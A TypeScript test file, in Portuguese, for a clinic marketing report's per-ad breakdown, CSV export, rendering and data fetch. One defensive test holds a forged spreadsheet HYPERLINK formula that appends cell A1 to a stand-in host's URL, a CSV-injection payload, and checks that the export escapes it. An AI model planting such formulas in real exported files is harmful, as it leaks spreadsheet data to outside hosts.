import type { SupabaseClient } from "@supabase/supabase-js";
import type { ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";

import {
  DIMENSOES_DA_ORIGEM,
  ROTULO_ANUNCIO_NAO_IDENTIFICADO,
  ROTULO_SEM_ANUNCIO,
  TITULO_DO_DETALHE_DA_ORIGEM,
  lerDimensaoDaOrigem,
  linhasDoCsv,
  montarDetalheDeOrigem,
  montarExportavelDaAba,
  rotulosDosAnuncios,
  type EntradaDaExportacao,
} from "@/lib/domain/exportacao-de-resultados";
import {
  fetchAnunciosDoPeriodo,
  relatoriosKeys,
  type AnunciosDoPeriodo,
  type LinhaDeAnuncioDoPeriodo,
} from "@/lib/queries/relatorios";
import { gerarCsv } from "@/lib/utils/csv";

import {
  CONVERSOES,
  FUNIL,
  anunciosDoPeriodo,
  campanhasPeriodizadas,
} from "./dados-de-exemplo";

// Dimensao "Anuncio" do Detalhe da origem (pedido do dono em 20/10/2026): uma
// linha por anuncio com o titulo que veio na mensagem (senao o nome do
// anuncio na Meta, senao "Anúncio sem título (id 120240624148610289)"), as
// mesmas metricas das outras dimensoes, "Anúncio não identificado" e "Sem
// anúncio da Meta", e a exportacao na mesma dimensao.

// Os dois anuncios reais da primeira clinica (Salud Care, 20/10/2026): os
// dois terminam em 10289, entao o "final 0289" de antes repetia o rotulo.
const ANUNCIO_REAL_1 = "120240624148610289";
const ANUNCIO_REAL_2 = "120248355615910289";

vi.mock("@/components/shared/permission-hint", () => ({
  DisabledWithHint: ({
    hint,
    children,
  }: {
    hint: string;
    children: ReactNode;
  }) => <span data-dica={hint}>{children}</span>,
}));

vi.mock("@/app/(app)/relatorios/actions", () => ({
  definirObjetivoDeConversaoAction: vi.fn(),
  removerObjetivoDeConversaoAction: vi.fn(),
  registrarLinhaDeBaseAction: vi.fn(),
  registrarExportacaoDeRelatorioAction: vi.fn(),
}));

const { DetalheDaOrigem } =
  await import("@/components/relatorios/detalhe-da-origem");
const { AbaMarketing } = await import("@/components/relatorios/aba-marketing");

const nada = () => undefined;
const PERIODO = { diaDe: "2026-10-01", diaAte: "2026-10-20" };

/** Texto sem tags, com espacos normalizados. */
function texto(markup: string): string {
  return markup
    .replace(/<[^>]+>/g, " ")
    .replace(/\s+/g, " ")
    .trim();
}

function linha(
  adId: string,
  titulo: string | null,
  nomeNaMeta: string | null = null,
): LinhaDeAnuncioDoPeriodo {
  return {
    adId,
    titulo,
    nomeNaMeta,
    descricao: null,
    link: null,
    plataformas: null,
    leads: 1,
    agendaram: 0,
    compareceram: 0,
  };
}

describe("montarDetalheDeOrigem por anúncio", () => {
  it("uma linha por anúncio, mais Anúncio não identificado e Sem anúncio da Meta, com as métricas das outras dimensões", () => {
    expect(
      montarDetalheDeOrigem(FUNIL, "anuncio", undefined, anunciosDoPeriodo()),
    ).toEqual([
      {
        rotulo: "Limpeza de pele com 30% de desconto",
        leads: 100,
        agendaram: 70,
        compareceram: 50,
        comparecimento: "50,0%",
      },
      {
        rotulo: "Botox outubro",
        leads: 40,
        agendaram: 30,
        compareceram: 20,
        comparecimento: "50,0%",
      },
      {
        rotulo: "Anúncio sem título (id 120240624148610291)",
        leads: 10,
        agendaram: 5,
        compareceram: 3,
        comparecimento: "30,0%",
      },
      {
        rotulo: ROTULO_ANUNCIO_NAO_IDENTIFICADO,
        leads: 12,
        agendaram: 7,
        compareceram: 7,
        comparecimento: "58,3%",
      },
      {
        rotulo: ROTULO_SEM_ANUNCIO,
        leads: 324,
        agendaram: 200,
        compareceram: 170,
        comparecimento: "52,5%",
      },
    ]);
  });

  it("as linhas somam os leads do período (o mesmo número do funil)", () => {
    const linhas = montarDetalheDeOrigem(
      FUNIL,
      "anuncio",
      undefined,
      anunciosDoPeriodo(),
    )!;
    const soma = (campo: "leads" | "agendaram" | "compareceram") =>
      linhas.reduce((total, l) => total + (l[campo] ?? 0), 0);
    expect(soma("leads")).toBe(FUNIL.coorte.leads);
    expect(soma("agendaram")).toBe(FUNIL.coorte.agendaram);
    expect(soma("compareceram")).toBe(FUNIL.coorte.compareceram);
  });

  it("sem lead não identificado nem sem anúncio: as duas linhas somem", () => {
    const linhas = montarDetalheDeOrigem(
      FUNIL,
      "anuncio",
      undefined,
      anunciosDoPeriodo({
        naoIdentificado: {
          leads: 0,
          agendaram: 0,
          compareceram: 0,
          plataformas: [],
        },
        semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
      }),
    )!;
    expect(linhas.map((l) => l.rotulo)).not.toContain(ROTULO_SEM_ANUNCIO);
    expect(linhas.map((l) => l.rotulo)).not.toContain(
      ROTULO_ANUNCIO_NAO_IDENTIFICADO,
    );
  });

  it("sem os anúncios carregados: null (carregando), nunca lista vazia", () => {
    expect(montarDetalheDeOrigem(FUNIL, "anuncio", undefined)).toBeNull();
    expect(
      montarDetalheDeOrigem(FUNIL, "anuncio", undefined, undefined),
    ).toBeNull();
  });

  it("período sem lead: lista vazia (o estado vazio da tabela)", () => {
    expect(
      montarDetalheDeOrigem(FUNIL, "anuncio", undefined, {
        leads: 0,
        linhas: [],
        naoIdentificado: {
          leads: 0,
          agendaram: 0,
          compareceram: 0,
          plataformas: [],
        },
        semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
      }),
    ).toEqual([]);
  });
});

describe("rotulosDosAnuncios", () => {
  it("os dois anúncios reais (os dois terminam em 10289) sem título nem nome: rótulos diferentes, com o id inteiro", () => {
    expect(
      rotulosDosAnuncios([
        linha(ANUNCIO_REAL_1, null),
        linha(ANUNCIO_REAL_2, null),
      ]),
    ).toEqual([
      "Anúncio sem título (id 120240624148610289)",
      "Anúncio sem título (id 120248355615910289)",
    ]);
  });

  it("os dois anúncios reais com o mesmo título: o desempate usa o id inteiro", () => {
    const rotulos = rotulosDosAnuncios([
      linha(ANUNCIO_REAL_1, "Avaliação gratuita"),
      linha(ANUNCIO_REAL_2, "Avaliação gratuita"),
    ]);
    expect(rotulos).toEqual([
      "Avaliação gratuita (id 120240624148610289)",
      "Avaliação gratuita (id 120248355615910289)",
    ]);
    expect(new Set(rotulos).size).toBe(2);
  });

  it("os dois anúncios reais com o mesmo nome na Meta: o desempate usa o id inteiro", () => {
    expect(
      rotulosDosAnuncios([
        linha(ANUNCIO_REAL_1, null, "Criativo outubro"),
        linha(ANUNCIO_REAL_2, null, "Criativo outubro"),
      ]),
    ).toEqual([
      "Criativo outubro (id 120240624148610289)",
      "Criativo outubro (id 120248355615910289)",
    ]);
  });

  it("títulos repetidos (sem diferença de maiúscula) ganham o id; os únicos não", () => {
    expect(
      rotulosDosAnuncios([
        linha("120240624148610289", "Botox em Fortaleza"),
        linha("120240624148617777", "BOTOX em fortaleza"),
        linha("120240624148610290", "Limpeza de pele"),
      ]),
    ).toEqual([
      "Botox em Fortaleza (id 120240624148610289)",
      "BOTOX em fortaleza (id 120240624148617777)",
      "Limpeza de pele",
    ]);
  });

  it("título vence o nome na Meta; o nome repetido também ganha o id", () => {
    expect(
      rotulosDosAnuncios([
        linha("1001", null, "Criativo A"),
        linha("1002", null, "Criativo A"),
        linha("1003", "Título guardado", "Criativo A"),
      ]),
    ).toEqual([
      "Criativo A (id 1001)",
      "Criativo A (id 1002)",
      "Título guardado",
    ]);
  });

  it("o desempate nunca cria rótulo repetido (nem com título que já parece um desempate)", () => {
    const rotulos = rotulosDosAnuncios([
      linha("1", "Botox"),
      linha("2", "Botox"),
      linha("3", "Botox (id 1)"),
      linha("4", "Anúncio sem título (id 5)"),
      linha("5", null),
    ]);
    expect(new Set(rotulos.map((r) => r.toLocaleLowerCase("pt-BR"))).size).toBe(
      5,
    );
    expect(rotulos[0]).toBe("Botox (id 1)");
    expect(rotulos[1]).toBe("Botox (id 2)");
    expect(rotulos[2]).toBe("Botox (id 1) (id 3)");
    expect(rotulos[4]).toBe("Anúncio sem título (id 5)");
  });
});

// Os dois anuncios reais no periodo, como a Salud Care vai ver depois da
// publicacao: nenhum titulo guardado (as mensagens sao de antes) e
// meta_anuncio vazia.
function anunciosReais(titulo: string | null = null): AnunciosDoPeriodo {
  return {
    leads: 45,
    linhas: [
      {
        adId: ANUNCIO_REAL_1,
        titulo,
        nomeNaMeta: null,
        descricao: null,
        link: null,
        plataformas: null,
        leads: 26,
        agendaram: 4,
        compareceram: 2,
      },
      {
        adId: ANUNCIO_REAL_2,
        titulo,
        nomeNaMeta: null,
        descricao: null,
        link: null,
        plataformas: null,
        leads: 19,
        agendaram: 3,
        compareceram: 1,
      },
    ],
    naoIdentificado: {
      leads: 0,
      agendaram: 0,
      compareceram: 0,
      plataformas: [],
    },
    semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
  };
}

describe("dimensões do Detalhe da origem", () => {
  it("Canal, Campanha e Anúncio, nessa ordem; valor desconhecido cai em Canal", () => {
    expect(DIMENSOES_DA_ORIGEM.map((d) => d.rotulo)).toEqual([
      "Canal",
      "Campanha",
      "Anúncio",
    ]);
    expect(lerDimensaoDaOrigem("anuncio")).toBe("anuncio");
    expect(lerDimensaoDaOrigem("campanha")).toBe("campanha");
    expect(lerDimensaoDaOrigem("outra")).toBe("canal");
    expect(TITULO_DO_DETALHE_DA_ORIGEM.anuncio).toBe("Detalhe por anúncio");
  });
});

function entrada(
  extra: Partial<EntradaDaExportacao> = {},
): EntradaDaExportacao {
  return {
    aba: "marketing",
    podeVerValores: false,
    canalOficial: false,
    funil: { atual: FUNIL, anterior: null },
    conversoes: CONVERSOES,
    campanhas: campanhasPeriodizadas(null),
    timezone: "America/Fortaleza",
    dimensaoOrigem: "anuncio",
    dimensaoAgenda: "profissional",
    anuncios: anunciosDoPeriodo(),
    ...extra,
  };
}

describe("exportação na dimensão Anúncio", () => {
  it("a seção Detalhe por anúncio com as mesmas linhas da tabela", () => {
    const exportavel = montarExportavelDaAba(entrada());
    const detalhe = exportavel.secoes.find(
      (secao) => secao.titulo === "Detalhe por anúncio",
    );
    expect(detalhe?.linhas).toEqual([
      ["Origem", "Leads", "Agendaram", "Compareceram", "Comparecimento"],
      ["Limpeza de pele com 30% de desconto", "100", "70", "50", "50,0%"],
      ["Botox outubro", "40", "30", "20", "50,0%"],
      ["Anúncio sem título (id 120240624148610291)", "10", "5", "3", "30,0%"],
      ["Anúncio não identificado", "12", "7", "7", "58,3%"],
      ["Sem anúncio da Meta", "324", "200", "170", "52,5%"],
    ]);
    // No CSV a secao abre com o titulo.
    expect(linhasDoCsv(exportavel)).toContainEqual(["Detalhe por anúncio"]);
  });

  it("os dois anúncios reais saem em linhas diferentes, com o id inteiro", () => {
    for (const [titulo, primeiro, segundo] of [
      [
        null,
        "Anúncio sem título (id 120240624148610289)",
        "Anúncio sem título (id 120248355615910289)",
      ],
      [
        "Avaliação gratuita",
        "Avaliação gratuita (id 120240624148610289)",
        "Avaliação gratuita (id 120248355615910289)",
      ],
    ] as const) {
      const detalhe = montarExportavelDaAba(
        entrada({ anuncios: anunciosReais(titulo) }),
      ).secoes.find((secao) => secao.titulo === "Detalhe por anúncio");
      expect(detalhe?.linhas.slice(1)).toEqual([
        [primeiro, "26", "4", "2", "7,7%"],
        [segundo, "19", "3", "1", "5,3%"],
      ]);
    }
  });

  it("o lead do Google cai em Sem anúncio da Meta, nunca em Sem anúncio", () => {
    expect(ROTULO_SEM_ANUNCIO).toBe("Sem anúncio da Meta");
    const linhas = linhasDoCsv(montarExportavelDaAba(entrada()));
    expect(linhas).toContainEqual([
      "Sem anúncio da Meta",
      "324",
      "200",
      "170",
      "52,5%",
    ]);
    expect(linhas.some((linha) => linha[0] === "Sem anúncio")).toBe(false);
  });

  it("título de anúncio que começa como fórmula sai como texto no CSV", () => {
    const forjado =
      '=HYPERLINK("https://exemplo.invalid/?d="&A1;"Clique aqui")';
    const csv = gerarCsv(
      linhasDoCsv(
        montarExportavelDaAba(
          entrada({
            anuncios: anunciosDoPeriodo({
              linhas: [
                {
                  adId: "120240624148610289",
                  titulo: forjado,
                  nomeNaMeta: null,
                  descricao: null,
                  link: null,
                  plataformas: null,
                  leads: 1,
                  agendaram: 0,
                  compareceram: 0,
                },
                {
                  adId: "120240624148610290",
                  titulo: "-30% na limpeza de pele",
                  nomeNaMeta: null,
                  descricao: null,
                  link: null,
                  plataformas: null,
                  leads: 1,
                  agendaram: 0,
                  compareceram: 0,
                },
              ],
            }),
          }),
        ),
      ),
    );
    const linhasDoArquivo = csv.split("\r\n");
    expect(linhasDoArquivo).toContain(
      `"'=HYPERLINK(""https://exemplo.invalid/?d=""&A1;""Clique aqui"")";1;0;0;0,0%`,
    );
    expect(linhasDoArquivo).toContain("'-30% na limpeza de pele;1;0;0;0,0%");
    expect(linhasDoArquivo.some((linha) => linha.startsWith("="))).toBe(false);
  });

  it("sem os anúncios carregados, a seção fica fora (nunca vazia falsa)", () => {
    const titulos = montarExportavelDaAba(
      entrada({ anuncios: undefined }),
    ).secoes.map((secao) => secao.titulo);
    expect(titulos).not.toContain("Detalhe por anúncio");
    expect(titulos).toContain("Campanhas");
  });

  it("nas outras dimensões nada muda", () => {
    const porCanal = montarExportavelDaAba(
      entrada({ dimensaoOrigem: "canal" }),
    );
    const titulos = porCanal.secoes.map((secao) => secao.titulo);
    expect(titulos).toContain("Detalhe por canal");
    expect(titulos).not.toContain("Detalhe por anúncio");
  });
});

describe("Detalhe da origem na tela, dimensão Anúncio", () => {
  function tela(extra: Partial<Parameters<typeof DetalheDaOrigem>[0]> = {}) {
    return renderToStaticMarkup(
      <DetalheDaOrigem
        funil={FUNIL}
        periodo={PERIODO}
        campanhas={campanhasPeriodizadas(null).atual}
        anuncios={anunciosDoPeriodo()}
        dimensao="anuncio"
        aoMudarDimensao={nada}
        {...extra}
      />,
    );
  }

  it("as linhas por anúncio na tabela, com o rótulo que quebra linha", () => {
    const html = tela();
    const lido = texto(html);
    expect(lido).toContain("Limpeza de pele com 30% de desconto");
    expect(lido).toContain("Botox outubro");
    expect(lido).toContain("Anúncio sem título (id 120240624148610291)");
    expect(lido).toContain("Anúncio não identificado");
    expect(lido).toContain("Sem anúncio da Meta");
    expect(html).toContain("whitespace-normal");
  });

  it("os dois anúncios reais na tabela: duas linhas diferentes, com o id inteiro", () => {
    const lido = texto(tela({ anuncios: anunciosReais() }));
    expect(lido).toContain("Anúncio sem título (id 120240624148610289)");
    expect(lido).toContain("Anúncio sem título (id 120248355615910289)");
    expect(lido).not.toContain("final 0289");
    const comTitulo = texto(
      tela({ anuncios: anunciosReais("Avaliação gratuita") }),
    );
    expect(comTitulo).toContain("Avaliação gratuita (id 120240624148610289)");
    expect(comTitulo).toContain("Avaliação gratuita (id 120248355615910289)");
  });

  it("carregando: sem linhas nem estado vazio", () => {
    const lido = texto(tela({ anuncios: undefined }));
    expect(lido).not.toContain("Sem leads no período");
    expect(lido).not.toContain("Sem anúncio");
  });

  it("erro: o aviso com Tentar de novo, sem tabela", () => {
    const html = tela({
      anuncios: undefined,
      anunciosComErro: true,
      tentarAnunciosDeNovo: <button type="button">Tentar de novo</button>,
    });
    const lido = texto(html);
    expect(lido).toContain("Não foi possível carregar os anúncios.");
    expect(lido).toContain("Tentar de novo");
    expect(html).toContain('role="alert"');
  });

  it("o erro dos anúncios não aparece nas outras dimensões", () => {
    const lido = texto(
      tela({ dimensao: "canal", anuncios: undefined, anunciosComErro: true }),
    );
    expect(lido).not.toContain("Não foi possível carregar os anúncios.");
  });

  it("nenhum travessão", () => {
    expect(tela()).not.toMatch(/[\u{2013}\u{2014}]/u);
  });

  it("a aba Marketing leva os anúncios até o detalhe", () => {
    const html = renderToStaticMarkup(
      <AbaMarketing
        funil={{ atual: FUNIL, anterior: null }}
        periodo={PERIODO}
        campanhas={campanhasPeriodizadas(null)}
        campanhasComErro={false}
        aoTentarCampanhasDeNovo={nada}
        anuncios={anunciosDoPeriodo()}
        anunciosComErro={false}
        aoTentarAnunciosDeNovo={nada}
        conversoes={CONVERSOES}
        timezone="America/Fortaleza"
        podeVerValores={false}
        dimensao="anuncio"
        aoMudarDimensao={nada}
      />,
    );
    expect(texto(html)).toContain("Limpeza de pele com 30% de desconto");
  });
});

describe("fetchAnunciosDoPeriodo", () => {
  function cliente(resposta: {
    data: unknown;
    error: { message: string } | null;
  }) {
    const chamadas: { nome: string; args: Record<string, unknown> }[] = [];
    const supabase = {
      rpc: async (nome: string, args: Record<string, unknown>) => {
        chamadas.push({ nome, args });
        return resposta;
      },
    } as unknown as SupabaseClient;
    return { supabase, chamadas };
  }

  it("chama anuncios_do_periodo com a janela em UTC dos dias civis da clínica e lê o corpo", async () => {
    const { supabase, chamadas } = cliente({
      data: {
        leads: 3,
        linhas: [
          {
            ad_id: "120240624148610289",
            titulo: "Título",
            nome_na_meta: null,
            leads: 2,
            agendaram: 1,
            compareceram: 0,
          },
        ],
        nao_identificado: { leads: 0, agendaram: 0, compareceram: 0 },
        sem_anuncio: { leads: 1, agendaram: 1, compareceram: 1 },
      },
      error: null,
    });
    const anuncios = await fetchAnunciosDoPeriodo(
      supabase,
      "c1",
      "America/Fortaleza",
      "2026-10-01",
      "2026-10-31",
    );
    expect(chamadas).toEqual([
      {
        nome: "anuncios_do_periodo",
        args: {
          p_clinic_id: "c1",
          p_de: "2026-10-01T03:00:00.000Z",
          p_ate: "2026-11-01T03:00:00.000Z",
        },
      },
    ]);
    // O corpo de antes da migration 20261026130000 (sem texto, link nem
    // plataformas): os campos novos chegam nulos, sem lancar.
    expect(anuncios).toEqual({
      leads: 3,
      linhas: [
        {
          adId: "120240624148610289",
          titulo: "Título",
          nomeNaMeta: null,
          descricao: null,
          link: null,
          plataformas: null,
          leads: 2,
          agendaram: 1,
          compareceram: 0,
        },
      ],
      naoIdentificado: {
        leads: 0,
        agendaram: 0,
        compareceram: 0,
        plataformas: null,
      },
      semAnuncio: { leads: 1, agendaram: 1, compareceram: 1 },
    });
    expect(relatoriosKeys.anuncios("c1", "2026-10-01", "2026-10-31")).toEqual([
      "relatorios",
      "c1",
      "anuncios",
      "2026-10-01",
      "2026-10-31",
    ]);
  });

  it("desde a migration 20261026130000: o texto, o link e as plataformas (aparadas; vazia vira nula); soma que não bate vira null", async () => {
    const { supabase } = cliente({
      data: {
        leads: 30,
        linhas: [
          {
            ad_id: "120248355615910289",
            titulo: "Cuide por apenas R$12,99 ao dia",
            nome_na_meta: null,
            descricao: "Plano de saúde a partir de R$12,99.\nFale com a gente.",
            link: "https://fb.me/cuide",
            plataformas: [
              { plataforma: " Instagram ", leads: 18 },
              { plataforma: "", leads: 5 },
              { plataforma: null, leads: 2 },
            ],
            leads: 25,
            agendaram: 0,
            compareceram: 0,
          },
          {
            ad_id: "120240624148610289",
            titulo: null,
            nome_na_meta: null,
            descricao: null,
            link: null,
            // 3 + 1 nao fecha os 5 leads: a tela nao mostra a divisao
            plataformas: [
              { plataforma: "Facebook", leads: 3 },
              { plataforma: null, leads: 1 },
            ],
            leads: 5,
            agendaram: 0,
            compareceram: 0,
          },
        ],
        nao_identificado: {
          leads: 0,
          agendaram: 0,
          compareceram: 0,
          plataformas: [],
        },
        sem_anuncio: { leads: 0, agendaram: 0, compareceram: 0 },
      },
      error: null,
    });
    const anuncios = await fetchAnunciosDoPeriodo(
      supabase,
      "c1",
      "America/Fortaleza",
      "2026-10-01",
      "2026-10-31",
    );
    expect(anuncios.linhas[0]).toMatchObject({
      descricao: "Plano de saúde a partir de R$12,99.\nFale com a gente.",
      link: "https://fb.me/cuide",
      plataformas: [
        { plataforma: "Instagram", leads: 18 },
        { plataforma: null, leads: 5 },
        { plataforma: null, leads: 2 },
      ],
    });
    expect(anuncios.linhas[1]?.plataformas).toBeNull();
    expect(anuncios.naoIdentificado.plataformas).toEqual([]);
  });

  it("null (profissional) e erro viram erro, nunca tabela vazia", async () => {
    await expect(
      fetchAnunciosDoPeriodo(
        cliente({ data: null, error: null }).supabase,
        "c1",
        "America/Fortaleza",
        "2026-10-01",
        "2026-10-31",
      ),
    ).rejects.toThrow("Recorte indisponível");
    await expect(
      fetchAnunciosDoPeriodo(
        cliente({ data: null, error: { message: "permission denied" } })
          .supabase,
        "c1",
        "America/Fortaleza",
        "2026-10-01",
        "2026-10-31",
      ),
    ).rejects.toThrow("permission denied");
  });
});
